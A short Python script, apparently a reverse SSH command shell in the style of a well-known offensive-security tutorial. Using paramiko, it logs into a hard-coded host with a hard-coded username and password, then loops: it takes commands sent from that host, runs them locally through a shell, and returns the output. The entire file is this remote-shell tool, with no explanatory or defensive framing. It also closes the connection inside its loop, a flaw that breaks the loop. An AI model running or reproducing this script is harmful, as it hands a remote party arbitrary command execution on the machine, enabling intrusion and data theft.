import sys
import getpass
import paramiko
import threading
import subprocess


def ssh_command(ip,user,passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,username=user,password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(4096))
        while True:
            command = ssh_session.recv(4096)
            try:
                cmd_output = subprocess.check_output(command,shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))

            client.close()
    return

ssh_command('192.168.100.134','dynamo','1590','id')

